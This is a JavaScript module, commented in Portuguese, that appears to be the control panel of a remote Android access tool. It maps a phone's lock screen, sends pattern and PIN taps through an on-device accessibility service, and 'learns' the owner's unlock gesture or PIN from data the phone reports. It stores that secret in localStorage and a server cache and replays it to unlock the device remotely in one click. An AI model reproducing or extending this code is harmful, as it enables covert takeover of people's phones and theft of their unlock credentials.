/* ==========================================================================
   MÓDULO 2 — device-lock-map.js  (v2 — com Auto-Desbloqueio / Aprendizado)
   --------------------------------------------------------------------------
   Mapa Visual Interativo + Sincronização de dispositivo selecionado +
   Salvamento garantido da senha de desbloqueio + Execução em 1 clique.

   Depende de: window.socket (Socket.IO) e window.aparelhoSelecionado.
   Elementos do index.html já existentes controlados por este módulo:
     #auto-unlock-saved-badge   (selo verde "Aprendizado Automático")
     #btn-auto-unlock-action    (botão ⚡ Desbloquear Tela)
     #btn-limpar-senha-salva    (botão 🗑️ Limpar Senha Salva)
   Funções globais expostas (para os onclick do index.html):
     window.executarAutoDesbloqueioRemoto()
     window.limparSenhaSalvaDispositivo()
   ========================================================================== */
(function () {
    'use strict';

    // ── Dispositivo autorizado a usar este mapa visual ──────────────────
    const ALLOWED_DEVICE_ID = 'samsung-SM-A105M';

    // Fallback proporcional (720 x 1382) das 9 bolinhas do padrão.
    const FALLBACK_X_FRAC = [0.25, 0.50, 0.75];
    const FALLBACK_Y_FRAC = [0.55, 0.665, 0.78];

    const ROTULOS_ESTADO = {
        tela_apagada:      'Tela Apagada',
        tela_capa:         'Tela de Capa',
        aguardando_padrao: 'Aguardando Padrão',
        aguardando_pin:    'Aguardando PIN',
        desbloqueado:      'Desbloqueado'
    };

    // Estados considerados "na tela de bloqueio" → apenas gestos feitos
    // ENQUANTO um destes estados é o último conhecido podem ser salvos.
    const ESTADOS_BLOQUEIO = ['tela_apagada', 'tela_capa', 'aguardando_padrao', 'aguardando_pin'];

    // Estado interno do módulo
    let _socket = null;
    let _largura = 720, _altura = 1382;
    let _modo = 'padrao';
    let _sequencia = [];                   // pontos do padrão em desenho (coord reais)
    let _arrastando = false;

    // ── AUTO-DESBLOQUEIO: estado de aprendizado ─────────────────────────
    let _dispositivoAtivo = null;          // deviceId LIMPO (sem " (Flutuante)")
    let _ultimoEstadoTela = 'desconhecido';// último lockscreen_estado recebido
    // Buffer temporário: só é persistido quando lockscreen_desbloqueado_ok chega.
    // Formato: { tipo: 'padrao'|'pin'|'gesto', pontos: [{x,y}...] } (padrao/gesto)
    //       ou { tipo: 'pin', toques: [{x,y}...] }
    let _bufferDesbloqueio = null;

    const $ = (id) => document.getElementById(id);
    // ★ CORREÇÃO (PROBLEMA 1): aparelhoSelecionado é declarado com 'let' no
    // script principal do index.html — 'let' NÃO cria propriedade em window,
    // então window.aparelhoSelecionado era sempre undefined (por isso o selo
    // ficava em "Nenhum Aparelho Selecionado"). Lê a variável global lexical
    // diretamente (typeof evita ReferenceError), com fallback para window.
    const dispositivoAtual = () => {
        try {
            if (typeof aparelhoSelecionado !== 'undefined' && aparelhoSelecionado) {
                return aparelhoSelecionado;
            }
        } catch (e) { /* variável não declarada ainda */ }
        return window.aparelhoSelecionado || null;
    };

    function log(msg) {
        const el = $('lock-log');
        if (!el) return;
        const t = new Date().toLocaleTimeString('pt-BR');
        el.innerHTML = `<div>[${t}] ${msg}</div>` + el.innerHTML;
    }

    // ==================================================================
    // CORREÇÃO 1 — Sincronização do dispositivo selecionado
    // ==================================================================

    /** Remove sufixo " (Flutuante)" e normaliza o ID do dispositivo. */
    function limparDeviceId(texto) {
        if (!texto) return null;
        return String(texto)
            .replace(/\s*\(Flutuante\)\s*$/i, '')
            .replace(/^⚡\s*/, '')
            .trim();
    }

    function dispositivoAutorizado() {
        const d = limparDeviceId(dispositivoAtual());
        return !!d && d === ALLOWED_DEVICE_ID;
    }

    /**
     * Ponto central da sincronização. Chamado IMEDIATAMENTE por:
     *   - visualizarDispositivo() no index.html (via hook DeviceLockMap.selecionarDispositivo)
     *   - socket.on('aparelho_selecionado')
     *   - polling interno (1s) como rede de segurança
     * Atualiza o selo verde e, se houver senha salva em localStorage, já
     * habilita o botão de 1 clique na hora.
     */
    function selecionarDispositivo(idBruto) {
        const id = limparDeviceId(idBruto) || limparDeviceId(dispositivoAtual());
        if (!id) {
            _dispositivoAtivo = null;
            atualizarSeloAutoUnlock();
            return;
        }
        const mudou = (id !== _dispositivoAtivo);
        _dispositivoAtivo = id;

        // ★ CORREÇÃO (PROBLEMA 2): pergunta ao servidor se já existe senha
        // salva em cache (dicionário senhas_salvas) — pode ter sido salva por
        // outro navegador ou pelo próprio Android. Ativa o botão na hora.
        if (_socket && _socket.connected) {
            try { _socket.emit('lockscreen_pedir_senha', { dispositivo: id }); } catch (e) {}
        }

        // Ativa/desativa o painel do mapa visual (só p/ ALLOWED_DEVICE_ID).
        const painel = $('specific-device-lock-panel');
        if (painel) painel.classList.toggle('ativo', id === ALLOWED_DEVICE_ID);

        if (mudou) {
            _bufferDesbloqueio = null; // trocou de dispositivo → descarta buffer
            log('Dispositivo sincronizado: ' + id);
        }
        atualizarSeloAutoUnlock();
    }

    /**
     * Atualiza o selo verde (#auto-unlock-saved-badge) e o botão
     * #btn-auto-unlock-action conforme o dispositivo ativo e a senha salva.
     */
    function atualizarSeloAutoUnlock() {
        const selo = $('auto-unlock-saved-badge');
        const btn = $('btn-auto-unlock-action');
        const btnLimpar = $('btn-limpar-senha-salva');

        if (!_dispositivoAtivo) {
            if (selo) { selo.textContent = 'Nenhum Aparelho Selecionado'; selo.style.background = '#374151'; selo.style.color = '#9ca3af'; }
            if (btn) { btn.disabled = true; btn.textContent = '⚡ Desbloquear Tela (Nenhuma Senha Salva)'; }
            if (btnLimpar) btnLimpar.style.display = 'none';
            return;
        }

        const salvo = carregarSenhaSalva(_dispositivoAtivo);
        if (salvo) {
            if (selo) { selo.textContent = 'Senha Salva para este Dispositivo ✓'; selo.style.background = '#14532d'; selo.style.color = '#86efac'; }
            if (btn) { btn.disabled = false; btn.textContent = '⚡ Desbloquear Tela (Automático — 1 Clique)'; }
            if (btnLimpar) btnLimpar.style.display = 'inline-block';
        } else {
            if (selo) { selo.textContent = 'Aparelho: ' + _dispositivoAtivo + ' — aprendendo…'; selo.style.background = '#1e3a8a'; selo.style.color = '#bfdbfe'; }
            if (btn) { btn.disabled = true; btn.textContent = '⚡ Desbloquear Tela (Nenhuma Senha Salva)'; }
            if (btnLimpar) btnLimpar.style.display = 'none';
        }
    }

    // ── localStorage: unlock_data_<deviceId> ────────────────────────────
    function chaveStorage(deviceId) { return 'unlock_data_' + deviceId; }

    function carregarSenhaSalva(deviceId) {
        try {
            const raw = localStorage.getItem(chaveStorage(deviceId));
            return raw ? JSON.parse(raw) : null;
        } catch (e) { return null; }
    }

    function salvarSenhaSalva(deviceId, dados) {
        try {
            const payload = Object.assign({}, dados, {
                deviceId: deviceId,
                salvoEm: new Date().toISOString()
            });
            localStorage.setItem(chaveStorage(deviceId), JSON.stringify(payload));
            return true;
        } catch (e) {
            log('Erro ao salvar senha: ' + e.message);
            return false;
        }
    }

    // ==================================================================
    // CORREÇÃO 2 — Buffer de gestos + salvamento garantido
    // ==================================================================

    /** Retorna true se o último estado conhecido é de tela bloqueada. */
    function estaNaTelaDeBloqueio() {
        return ESTADOS_BLOQUEIO.indexOf(_ultimoEstadoTela) !== -1;
    }

    /**
     * Registra um gesto no buffer TEMPORÁRIO, SOMENTE se o dispositivo
     * estiver na tela de bloqueio. Gestos feitos com o celular já
     * desbloqueado são ignorados (não poluem o aprendizado).
     * Público: DeviceLockMap.registrarGestoDesbloqueio(tipo, dados) —
     * pode ser chamado pelo index.html para arrastos na janela flutuante.
     */
    function registrarGestoDesbloqueio(tipo, dados) {
        if (!estaNaTelaDeBloqueio()) {
            log('Gesto IGNORADO (tela já desbloqueada): ' + tipo);
            return;
        }
        if (tipo === 'padrao' && dados && dados.pontos && dados.pontos.length >= 2) {
            _bufferDesbloqueio = { tipo: 'padrao', pontos: dados.pontos };
            log('Buffer de padrão registrado (' + dados.pontos.length + ' pontos).');
        } else if (tipo === 'pin_toque' && dados && typeof dados.x === 'number') {
            if (!_bufferDesbloqueio || _bufferDesbloqueio.tipo !== 'pin') {
                _bufferDesbloqueio = { tipo: 'pin', toques: [] };
            }
            _bufferDesbloqueio.toques.push({ x: dados.x, y: dados.y });
            log('Buffer de PIN registrado (' + _bufferDesbloqueio.toques.length + ' toques).');
        } else if (tipo === 'gesto' && dados && dados.pontos) {
            _bufferDesbloqueio = { tipo: 'gesto', pontos: dados.pontos };
            log('Buffer de gesto contínuo registrado.');
        }
    }

    /**
     * Recebe lockscreen_desbloqueado_ok do Android (via servidor).
     * Salva DEFINITIVAMENTE a sequência: prioriza o gestureData enviado
     * pelo dispositivo (autoritativo); senão, usa o buffer local.
     */
    function aoDesbloqueadoOk(payload) {
        const deviceId = limparDeviceId(payload && (payload.deviceId || payload.dispositivo));
        if (!deviceId || deviceId !== _dispositivoAtivo) {
            log('lockscreen_desbloqueado_ok de OUTRO dispositivo ignorado (' + deviceId + ').');
            return;
        }

        let dadosParaSalvar = null;
        // 1) GestureData do Android (autoritativo) — pode ser {tipo, pontos/toques}
        if (payload && payload.gestureData) {
            const gd = payload.gestureData;
            // ★ CORREÇÃO (PROBLEMA 2): o Android envia o array como
            // 'pontosNormalizados' (e 'pontos' em versões novas). Aceita os dois.
            const pts = gd.pontos || gd.pontosNormalizados || null;
            dadosParaSalvar = {
                tipo: gd.tipo || 'padrao',
                pontos: pts,
                toques: gd.toques || null
            };
            log('Senha recebida via gestureData do Android (tipo=' + dadosParaSalvar.tipo + ', pontos=' + (pts ? pts.length : 0) + ').');
        } else if (payload && payload.senhaSalva) {
            // ★ CORREÇÃO: servidor reenvia a senha do cache senhas_salvas.
            dadosParaSalvar = payload.senhaSalva;
            log('Senha recebida do cache do servidor (tipo=' + dadosParaSalvar.tipo + ').');
        } else if (_bufferDesbloqueio) {
            // 2) Fallback: buffer local (padrão/PIN desenhado no painel)
            dadosParaSalvar = _bufferDesbloqueio;
            log('Senha salva a partir do buffer local (tipo=' + dadosParaSalvar.tipo + ').');
        }

        if (dadosParaSalvar && salvarSenhaSalva(deviceId, dadosParaSalvar)) {
            atualizarSeloAutoUnlock();
            log('✅ Senha de desbloqueio SALVA para ' + deviceId + '. Botão de 1 clique ativado.');
        } else {
            log('⚠ lockscreen_desbloqueado_ok recebido, mas sem gestureData e sem buffer local — nada salvo.');
        }
        _bufferDesbloqueio = null; // limpa o buffer em qualquer caso
    }

    // ==================================================================
    // CORREÇÃO 3 — Execução em 1 clique
    // ==================================================================

    /**
     * window.executarAutoDesbloqueioRemoto() — chamado pelo onclick do
     * botão verde #btn-auto-unlock-action. Recupera a senha salva em
     * localStorage e emite lockscreen_executar_auto_painel com o deviceId
     * e as coordenadas normalizadas para o MyAccessibilityService executar.
     */
    function executarAutoDesbloqueioRemoto() {
        if (!_socket || !_socket.connected) { log('Socket offline.'); return; }
        if (!_dispositivoAtivo) { log('Nenhum dispositivo selecionado.'); return; }
        const dados = carregarSenhaSalva(_dispositivoAtivo);
        if (!dados) { log('Nenhuma senha salva para ' + _dispositivoAtivo); atualizarSeloAutoUnlock(); return; }

        _socket.emit('lockscreen_executar_auto_painel', {
            dispositivo: _dispositivoAtivo,
            deviceId: _dispositivoAtivo,
            tipo: dados.tipo,
            pontos: dados.pontos || null,   // padrão / gesto contínuo [{x,y}...]
            toques: dados.toques || null,   // PIN [{x,y}...]
            larguraTela: _largura,
            alturaTela: _altura
        });
        log('⚡ Auto-desbloqueio disparado (tipo=' + dados.tipo + ') para ' + _dispositivoAtivo + '.');
    }

    function limparSenhaSalvaDispositivo() {
        if (!_dispositivoAtivo) return;
        try { localStorage.removeItem(chaveStorage(_dispositivoAtivo)); } catch (e) {}
        _bufferDesbloqueio = null;
        atualizarSeloAutoUnlock();
        log('Senha salva removida para ' + _dispositivoAtivo + '.');
    }

    /**
     * Salva uma senha MANUALMENTE no Aprendizado Automático do dispositivo
     * atualmente selecionado (sem depender do evento lockscreen_desbloqueado_ok).
     * Usado pelo botão "🔓 Desbloquear Padrão Agora": ao desenhar o padrão
     * correto e desbloquear, a sequência é aprendida na hora e o selo verde +
     * botão de 1 clique ficam ativos para os próximos desbloqueios.
     * @param {string} tipo  'padrao' | 'pin' | 'gesto'
     * @param {object} dados { pontos: [{x,y}...] }  ou  { toques: [{x,y}...] }
     * @returns {boolean} true se salvou.
     */
    function salvarSenhaManual(tipo, dados) {
        const id = _dispositivoAtivo || limparDeviceId(dispositivoAtual());
        if (!id) { log('Não foi possível salvar: nenhum dispositivo selecionado.'); return false; }
        _dispositivoAtivo = id;
        const payload = {
            tipo: tipo || 'padrao',
            pontos: (dados && dados.pontos) || null,
            toques: (dados && dados.toques) || null
        };
        if ((!payload.pontos || payload.pontos.length < 2) &&
            (!payload.toques || payload.toques.length < 1)) {
            log('Não foi possível salvar: sequência insuficiente.');
            return false;
        }
        if (salvarSenhaSalva(id, payload)) {
            atualizarSeloAutoUnlock();
            log('✅ Padrão APRENDIDO manualmente para ' + id + '. Botão de 1 clique ativado.');
            return true;
        }
        return false;
    }

    // Expõe como globais (os onclick do index.html referenciam estes nomes).
    window.executarAutoDesbloqueioRemoto = executarAutoDesbloqueioRemoto;
    window.limparSenhaSalvaDispositivo = limparSenhaSalvaDispositivo;

    // ==================================================================
    // Mapa visual — cálculo e render dos pontos (coord reais do dispositivo)
    // ==================================================================
    function calcularPontosPadrao(padraoBounds) {
        const pontos = [];
        let left, top, w, h;
        if (padraoBounds && padraoBounds.right > padraoBounds.left) {
            left = padraoBounds.left; top = padraoBounds.top;
            w = padraoBounds.right - padraoBounds.left;
            h = padraoBounds.bottom - padraoBounds.top;
        } else {
            left = FALLBACK_X_FRAC[0] * _largura;
            top = FALLBACK_Y_FRAC[0] * _altura;
            w = (FALLBACK_X_FRAC[2] - FALLBACK_X_FRAC[0]) * _largura;
            h = (FALLBACK_Y_FRAC[2] - FALLBACK_Y_FRAC[0]) * _altura;
        }
        for (let row = 0; row < 3; row++) {
            for (let col = 0; col < 3; col++) {
                const x = left + (col + 0.5) / 3 * w;
                const y = top + (row + 0.5) / 3 * h;
                pontos.push({
                    indice: row * 3 + col + 1,
                    x: Math.round(x), y: Math.round(y),
                    xPct: (x / _largura * 100),
                    yPct: (y / _altura * 100)
                });
            }
        }
        return pontos;
    }

    function renderModoPadrao(padraoBounds) {
        const mapa = $('lock-mapa-conteudo');
        if (!mapa) return;
        mapa.innerHTML = '';
        _sequencia = [];
        atualizarSequenciaUI();

        const pontos = calcularPontosPadrao(padraoBounds);
        pontos.forEach(p => {
            const dot = document.createElement('div');
            dot.className = 'lock-dot';
            dot.dataset.indice = p.indice;
            dot.dataset.x = p.x;
            dot.dataset.y = p.y;
            dot.style.left = p.xPct + '%';
            dot.style.top = p.yPct + '%';
            dot.textContent = p.indice;
            dot.setAttribute('aria-label', 'Ponto ' + p.indice + ' do padrão');
            mapa.appendChild(dot);
        });

        const svgNS = 'http://www.w3.org/2000/svg';
        const svg = document.createElementNS(svgNS, 'svg');
        svg.id = 'lock-linha-svg';
        svg.setAttribute('viewBox', '0 0 100 100');
        svg.setAttribute('preserveAspectRatio', 'none');
        const poly = document.createElementNS(svgNS, 'polyline');
        poly.id = 'lock-linha-poly';
        poly.setAttribute('points', '');
        svg.appendChild(poly);
        mapa.appendChild(svg);

        log('Modo Padrão: 9 bolinhas renderizadas' + (padraoBounds ? ' (coords reais).' : ' (fallback 720×1382).'));
    }

    function renderModoPin(pinBotoes) {
        const mapa = $('lock-mapa-conteudo');
        if (!mapa) return;
        mapa.innerHTML = '';
        _sequencia = [];
        atualizarSequenciaUI();

        if (!pinBotoes || pinBotoes.length === 0) {
            mapa.innerHTML = '<div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#6b7280;font-size:12px;padding:20px;text-align:center;">Nenhum botão numérico detectado. Use "Ler Tela de Bloqueio" novamente após o swipe-up.</div>';
            log('Modo PIN: sem botões detectados.');
            return;
        }
        pinBotoes.forEach(b => {
            const key = document.createElement('button');
            key.className = 'lock-pin-key';
            key.textContent = b.digito;
            key.style.left = (b.x / _largura * 100) + '%';
            key.style.top = (b.y / _altura * 100) + '%';
            key.setAttribute('aria-label', 'Tecla ' + b.digito);
            key.addEventListener('click', (e) => {
                e.stopPropagation();
                enviarTapPin(b.x, b.y, b.digito);
            });
            mapa.appendChild(key);
        });
        log('Modo PIN: ' + pinBotoes.length + ' teclas mapeadas.');
    }

    function enviarTapPin(x, y, digito) {
        if (!_socket || !_socket.connected) { log('Socket offline.'); return; }
        _socket.emit('lockscreen_pin_painel', { dispositivo: dispositivoAtual(), x, y });
        // CORREÇÃO 2: registra o toque no buffer (apenas se tela bloqueada).
        registrarGestoDesbloqueio('pin_toque', { x: x, y: y });
        log('PIN: toque em "' + digito + '" → (' + x + ', ' + y + ').');
    }

    // ── Seleção de pontos do padrão (clique + arraste) ─────────────────
    function pontoJaSelecionado(indice) { return _sequencia.some(p => p.indice === indice); }
    function adicionarPonto(indice, x, y) {
        if (pontoJaSelecionado(indice)) return;
        _sequencia.push({ indice, x, y });
        const dot = document.querySelector('.lock-dot[data-indice="' + indice + '"]');
        if (dot) dot.classList.add('selecionado');
        atualizarSequenciaUI();
        redesenharLinha();
    }
    function limparSelecao() {
        _sequencia = [];
        document.querySelectorAll('.lock-dot.selecionado').forEach(d => d.classList.remove('selecionado'));
        atualizarSequenciaUI();
        redesenharLinha();
        log('Desenho do padrão limpo.');
    }
    function atualizarSequenciaUI() {
        const el = $('lock-sequencia');
        const btn = $('lock-btn-desbloquear');
        if (el) el.textContent = _sequencia.length
            ? 'Sequência: ' + _sequencia.map(p => p.indice).join(' → ')
            : 'Clique ou arraste sobre as bolinhas para desenhar o padrão.';
        if (btn) btn.disabled = _sequencia.length < 2;
    }
    function redesenharLinha(pontoCursor) {
        const poly = $('lock-linha-poly');
        if (!poly) return;
        const pts = _sequencia.map(p => (p.x / _largura * 100) + ',' + (p.y / _altura * 100));
        if (pontoCursor) pts.push(pontoCursor.xPct + ',' + pontoCursor.yPct);
        poly.setAttribute('points', pts.join(' '));
    }
    function posicaoRelativa(e) {
        const wrap = $('lock-mapa-wrap');
        if (!wrap) return null;
        const r = wrap.getBoundingClientRect();
        const clientX = e.touches ? e.touches[0].clientX : e.clientX;
        const clientY = e.touches ? e.touches[0].clientY : e.clientY;
        return { xPct: (clientX - r.left) / r.width * 100, yPct: (clientY - r.top) / r.height * 100 };
    }
    function dotSobPonteiro(rel) {
        if (!rel) return null;
        const dots = document.querySelectorAll('.lock-dot');
        for (const d of dots) {
            const dx = parseFloat(d.style.left) - rel.xPct;
            const dy = parseFloat(d.style.top) - rel.yPct;
            if (Math.sqrt(dx * dx + dy * dy) < 7) return d;
        }
        return null;
    }
    function bindArraste() {
        const wrap = $('lock-mapa-wrap');
        if (!wrap) return;
        wrap.addEventListener('click', (e) => {
            if (_arrastando) return;
            const dot = e.target.closest('.lock-dot');
            if (dot) adicionarPonto(+dot.dataset.indice, +dot.dataset.x, +dot.dataset.y);
        });
        const iniciar = (e) => {
            if (_modo !== 'padrao') return;
            _arrastando = true;
            const rel = posicaoRelativa(e);
            const dot = dotSobPonteiro(rel);
            if (dot) adicionarPonto(+dot.dataset.indice, +dot.dataset.x, +dot.dataset.y);
            redesenharLinha(rel);
        };
        const mover = (e) => {
            if (!_arrastando || _modo !== 'padrao') return;
            const rel = posicaoRelativa(e);
            const dot = dotSobPonteiro(rel);
            if (dot) adicionarPonto(+dot.dataset.indice, +dot.dataset.x, +dot.dataset.y);
            redesenharLinha(rel);
        };
        const terminar = () => { _arrastando = false; redesenharLinha(); };
        wrap.addEventListener('mousedown', iniciar);
        window.addEventListener('mousemove', mover);
        window.addEventListener('mouseup', terminar);
        wrap.addEventListener('touchstart', iniciar, { passive: true });
        window.addEventListener('touchmove', mover, { passive: true });
        window.addEventListener('touchend', terminar);
    }

    // ── Ações dos botões do mapa ────────────────────────────────────────
    function acaoLer() {
        if (!_socket || !_socket.connected) { log('Socket offline.'); return; }
        _socket.emit('lockscreen_ler_painel', { dispositivo: dispositivoAtual() });
        log('Solicitada leitura da tela de bloqueio…');
    }
    function acaoSwipe() {
        if (!_socket || !_socket.connected) { log('Socket offline.'); return; }
        _socket.emit('lockscreen_swipe_painel', { dispositivo: dispositivoAtual() });
        log('Swipe-up enviado.');
    }
    function acaoAcessibilidade() {
        if (!_socket || !_socket.connected) { log('Socket offline.'); return; }
        _socket.emit('lockscreen_acessibilidade_painel', { dispositivo: dispositivoAtual() });
        log('Abrindo Acessibilidade no dispositivo…');
    }
    function acaoDesbloquear() {
        if (_sequencia.length < 2) { log('Selecione ao menos 2 pontos.'); return; }
        const pontos = _sequencia.map(p => ({ x: p.x, y: p.y }));
        const indices = _sequencia.map(p => p.indice);
        const payload = { dispositivo: dispositivoAtual(), pontos, indices };

        if (_socket && _socket.connected) {
            _socket.emit('desbloquear_padrao', payload);
            _socket.emit('lockscreen_pattern_painel', { dispositivo: dispositivoAtual(), pontos });
        }
        try {
            fetch(window.location.origin + '/desbloquear-padrao-http', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(function(e) {});
        } catch (e) {}

        registrarGestoDesbloqueio('padrao', { pontos: pontos });
        log('Padrão enviado: ' + indices.join('→') + '.');
    }
    function alternarModo(modo) {
        _modo = modo;
        document.querySelectorAll('#lock-modos button').forEach(b => {
            b.classList.toggle('selecionado', b.dataset.modo === modo);
        });
        if (modo === 'padrao') renderModoPadrao(window.__lockUltimoPadraoBounds || null);
        else renderModoPin(window.__lockUltimosPins || []);
    }

    // ── Recebe o estado do dispositivo ──────────────────────────────────
    function aoReceberEstado(payload) {
        if (!payload) return;
        const id = limparDeviceId(payload.deviceId || payload.dispositivo);
        // Atualiza o dispositivo ativo a partir do payload (se ainda não sabíamos).
        if (id && !_dispositivoAtivo) selecionarDispositivo(id);
        // Só processa estado do dispositivo atualmente selecionado.
        if (id && _dispositivoAtivo && id !== _dispositivoAtivo) return;

        _largura = payload.larguraTela || 720;
        _altura = payload.alturaTela || 1382;
        _ultimoEstadoTela = payload.estado || _ultimoEstadoTela;

        // CORREÇÃO 2: se a tela foi desbloqueada SEM sucesso explícito,
        // descarta o buffer (não salva gestos pós-desbloqueio).
        if (_ultimoEstadoTela === 'desbloqueado') {
            if (_bufferDesbloqueio) { log('Buffer descartado (tela desbloqueada sem evento de OK).'); }
            _bufferDesbloqueio = null;
        }

        // O mapa visual (badge + grade) é restrito ao ALLOWED_DEVICE_ID.
        // O auto-desbloqueio (selo verde + botão) funciona para qualquer dispositivo.
        if (_dispositivoAtivo && _dispositivoAtivo !== ALLOWED_DEVICE_ID) return;

        const badge = $('lock-status-badge');
        if (badge) {
            badge.textContent = ROTULOS_ESTADO[payload.estado] || payload.estado;
            badge.className = '';
            badge.id = 'lock-status-badge';
            badge.classList.add(payload.estado || '');
        }
        log('Estado: ' + (ROTULOS_ESTADO[payload.estado] || payload.estado) +
            ' (tela ' + (payload.telaLigada ? 'ligada' : 'apagada') + ').');

        const alvos = payload.alvos || {};
        window.__lockUltimoPadraoBounds = alvos.padraoBounds || null;
        window.__lockUltimosPins = alvos.pin || [];

        if (payload.estado === 'aguardando_pin' && (alvos.pin || []).length > 0) alternarModo('pin');
        else if (payload.estado === 'aguardando_padrao' || alvos.padraoBounds) alternarModo('padrao');
        else if (_modo === 'padrao') renderModoPadrao(alvos.padraoBounds || null);
        else renderModoPin(alvos.pin || []);
    }

    // ★ CORREÇÃO (PROBLEMA 1): MutationObserver que detecta a abertura da
    // janela flutuante por QUALQUER caminho (botão Visualizar, botão mestre
    // "⚡ Visualizador Nativo", abrirUltimoConectado, dragBridge desktop).
    // Lê o título "#pop-header-title" ("⚡ X (Flutuante)") e o texto do botão
    // mestre, remove " (Flutuante)", e sincroniza o dispositivo na hora.
    function iniciarObservadorTitulo() {
        if (!window.MutationObserver) return;
        const processarTexto = (texto) => {
            if (!texto) return;
            const limpo = limparDeviceId(texto);
            // Só aceita textos que parecem um deviceId (contêm "-" e tamanho razoável).
            if (limpo && limpo.length >= 5 && limpo.indexOf('-') !== -1) {
                selecionarDispositivo(limpo);
            }
        };
        const observador = new MutationObserver((mutacoes) => {
            for (const m of mutacoes) {
                if (m.type === 'childList' || m.type === 'characterData') {
                    const no = m.target;
                    const texto = (no && no.textContent) ? no.textContent : (no && no.innerText) || '';
                    if (texto) processarTexto(texto);
                }
                if (m.type === 'attributes' && m.attributeName === 'style') {
                    const el = m.target;
                    if (el && el.id === 'emulador-flutuante-modal' && el.style.display !== 'none') {
                        const titulo = $('pop-header-title');
                        if (titulo) processarTexto(titulo.textContent);
                    }
                }
            }
        });
        const titulo = $('pop-header-title');
        if (titulo) observador.observe(titulo, { childList: true, characterData: true, subtree: true });
        const btnMestre = $('btn-ultimo-dispositivo');
        if (btnMestre) observador.observe(btnMestre, { childList: true, characterData: true, subtree: true });
        const modal = $('emulador-flutuante-modal');
        if (modal) observador.observe(modal, { attributes: true, attributeFilter: ['style'] });
        log('MutationObserver ativo (detecção automática da janela flutuante).');
    }

    // ── Inicialização pública ───────────────────────────────────────────
    function init(opcoes) {
        _socket = (opcoes && opcoes.socket) || window.socket;

        const bind = (id, fn) => { const el = $(id); if (el) el.addEventListener('click', fn); };
        bind('lock-btn-ler', acaoLer);
        bind('lock-btn-swipe', acaoSwipe);
        bind('lock-btn-acessibilidade', acaoAcessibilidade);
        bind('lock-btn-limpar', limparSelecao);
        bind('lock-btn-desbloquear', acaoDesbloquear);

        document.querySelectorAll('#lock-modos button').forEach(b => {
            b.addEventListener('click', () => alternarModo(b.dataset.modo));
        });

        bindArraste();

        if (_socket) {
            _socket.on('lockscreen_estado', aoReceberEstado);
            // ★ CORREÇÃO (PROBLEMA 2): o Android emite 'lockscreen_estado_mudou'
            // (campo status: bloqueado/desbloqueado). Sem este listener o JS
            // nunca sabe que a tela está bloqueada → o buffer local (Modo 1/2
            // desenhado no painel) não grava, e a senha não salva.
            _socket.on('lockscreen_estado_mudou', (p) => {
                if (!p) return;
                const id = limparDeviceId(p.deviceId || p.dispositivo);
                if (id && _dispositivoAtivo && id !== _dispositivoAtivo) return;
                if (p.status === 'bloqueado') {
                    _ultimoEstadoTela = 'tela_capa';
                    log('Android informa: tela BLOQUEADA (iniciando aprendizado).');
                } else if (p.status === 'desbloqueado') {
                    _ultimoEstadoTela = 'desbloqueado';
                    if (_bufferDesbloqueio) {
                        log('Buffer local descartado (tela desbloqueada sem evento de OK).');
                        _bufferDesbloqueio = null;
                    }
                }
            });
            // ★ CORREÇÃO (PROBLEMA 2): servidor reenvia a senha do cache
            // senhas_salvas ao selecionar/visualizar o dispositivo.
            _socket.on('lockscreen_senha_salva', (p) => {
                if (!p || !p.senhaSalva) return;
                const id = limparDeviceId(p.deviceId || p.dispositivo);
                if (id && id === _dispositivoAtivo && salvarSenhaSalva(id, p.senhaSalva)) {
                    atualizarSeloAutoUnlock();
                    log('✅ Senha recebida do cache do servidor e salva localmente (botão de 1 clique ativado).');
                }
            });
            _socket.on('desbloquear_padrao_resultado', function(res) {
                if (res) {
                    const ok = !!res.sucesso;
                    log(ok ? '🔓 Padrão CORRETO — Dispositivo desbloqueado!' : '❌ Padrão INCORRETO ou falha.');
                    const resEl = $('lock-resultado');
                    if (resEl) resEl.textContent = ok ? '🔓 Desbloqueado com sucesso!' : '❌ Padrão incorreto.';
                }
            });
            // CORREÇÃO 2: evento de sucesso do Android → salva a senha.
            _socket.on('lockscreen_desbloqueado_ok', aoDesbloqueadoOk);
            // CORREÇÃO 1: sincroniza imediatamente ao selecionar aparelho.
            _socket.on('aparelho_selecionado', (d) => {
                if (d && d.ok && d.selecionado) selecionarDispositivo(d.selecionado);
            });
            _socket.on('connect', () => selecionarDispositivo(dispositivoAtual()));
        }

        // ★ CORREÇÃO (PROBLEMA 1): MutationObserver — detecta a abertura da
        // janela flutuante por QUALQUER caminho (botão Visualizar, botão
        // mestre "⚡ Visualizador Nativo", abrirUltimoConectado, dragBridge
        // desktop) lendo o título "#pop-header-title" ("⚡ X (Flutuante)") e
        // o texto do botão mestre. Remove " (Flutuante)" e sincroniza na hora.
        iniciarObservadorTitulo();

        // CORREÇÃO 1: polling como rede de segurança (a troca de dispositivo
        // pode ocorrer por UI sem emitir aparelho_selecionado). Intervalo
        // curto de 1s para resposta imediata após clicar em "Visualizar".
        setInterval(() => selecionarDispositivo(dispositivoAtual()), 1000);
        selecionarDispositivo(dispositivoAtual());

        log('Módulo carregado (v2 com auto-desbloqueio). Aguardando ' + ALLOWED_DEVICE_ID + '.');
    }

    window.DeviceLockMap = {
        init,
        ALLOWED_DEVICE_ID,
        // CORREÇÃO 1: hook chamado por visualizarDispositivo() no index.html
        selecionarDispositivo: selecionarDispositivo,
        limparDeviceId: limparDeviceId,
        // CORREÇÃO 2: hook para o index.html registrar arrastos na janela flutuante
        registrarGestoDesbloqueio: registrarGestoDesbloqueio,
        // Aprende a senha na hora a partir do botão "Desbloquear Padrão Agora".
        salvarSenhaManual: salvarSenhaManual,
        forcarAtualizacao: () => selecionarDispositivo(dispositivoAtual())
    };
})();
